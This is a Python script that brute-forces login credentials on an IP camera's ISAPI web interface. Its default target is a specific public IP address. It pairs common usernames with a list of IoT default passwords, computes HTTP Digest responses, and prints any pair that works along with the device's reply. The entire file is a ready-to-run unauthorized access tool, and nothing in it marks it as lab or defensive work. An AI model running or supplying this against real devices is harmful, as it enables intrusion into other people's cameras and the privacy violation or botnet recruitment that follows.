#!/usr/bin/env python3
"""Credential search against the camera's ISAPI web backend (separate store from RTSP)."""

import hashlib
import http.client
import itertools
import os
import sys
import time

HOST = os.environ.get("CAM_HOST", "117.196.244.183")
PROBE = "/ISAPI/Security/capabilities"

USERNAMES = ["admin", "root", "user", "guest", "supervisor", "operator", "default"]
PASSWORDS = ["", "admin", "12345", "123456", "password", "pass", "xMeye", "vizxv",
             "xc3511", "xmhdipc", "juantech", "realtek", "hi3518", "klv123",
             "1234567890", "12345678", "000000", "111111", "888888", "666666",
             "admin123", "root", "system", "user", "guest", "supervisor",
             "default", "changeme", "test", "1234", "54321", "xc3511x"]


def md5hex(v):
    return hashlib.md5(v.encode()).hexdigest()


def get(path, auth=None):
    conn = http.client.HTTPConnection(HOST, 80, timeout=10)
    headers = {"User-Agent": "isapi-search/1.0", "Accept": "*/*"}
    if auth:
        headers["Authorization"] = auth
    conn.request("GET", path, headers=headers)
    resp = conn.getresponse()
    body = resp.read().decode("utf-8", "replace")
    challenge = resp.getheader("WWW-Authenticate")
    conn.close()
    return resp.status, challenge, body


status, challenge, _ = get(PROBE)
if status != 401 or not challenge:
    print(f"[!] Unexpected baseline response: {status}")
    sys.exit(1)

parsed = {}
for part in challenge.split(None, 1)[1].split(","):
    if "=" in part:
        k, _, v = part.strip().partition("=")
        parsed[k.strip().lower()] = v.strip().strip('"')
realm = parsed.get("realm", "")


def make_auth(user, password, nonce):
    ha1 = md5hex(f"{user}:{realm}:{password}")
    ha2 = md5hex(f"GET:{PROBE}")
    nc, cnonce = "00000001", "0a4f113bd92f1c2e"
    resp = md5hex(f"{ha1}:{nonce}:{nc}:{cnonce}:auth:{ha2}")
    return (f'Digest username="{user}", realm="{realm}", nonce="{nonce}", '
            f'uri="{PROBE}", qop=auth, nc={nc}, cnonce="{cnonce}", response="{resp}"')


pairs = list(itertools.product(USERNAMES, PASSWORDS))
print(f"[*] realm={realm}  {len(pairs)} pairs\n")

for i, (user, password) in enumerate(pairs, 1):
    try:
        st, ch, _ = get(PROBE)
    except Exception as exc:
        print(f"    ERR {exc}, continuing")
        time.sleep(1)
        continue
    if st != 401 or not ch:
        print(f"[+] UNLOCKED without auth -> {st}")
        break
    nonce = ""
    for part in ch.split(None, 1)[1].split(","):
        if "=" in part:
            k, _, v = part.strip().partition("=")
            if k.strip().lower() == "nonce":
                nonce = v.strip().strip('"')

    auth = make_auth(user, password, nonce)
    try:
        st2, _, body2 = get(PROBE, auth)
    except Exception as exc:
        print(f"    ERR {exc}")
        continue

    if st2 == 200:
        label = f"{user}:{password}" if password else f"{user}:<empty>"
        print(f"[+] SUCCESS {label}")
        print(f"    {body2.strip()[:500]}")
        sys.exit(0)
    if i % 25 == 0:
        print(f"    ...{i}/{len(pairs)}")

print("[-] no match")
sys.exit(2)
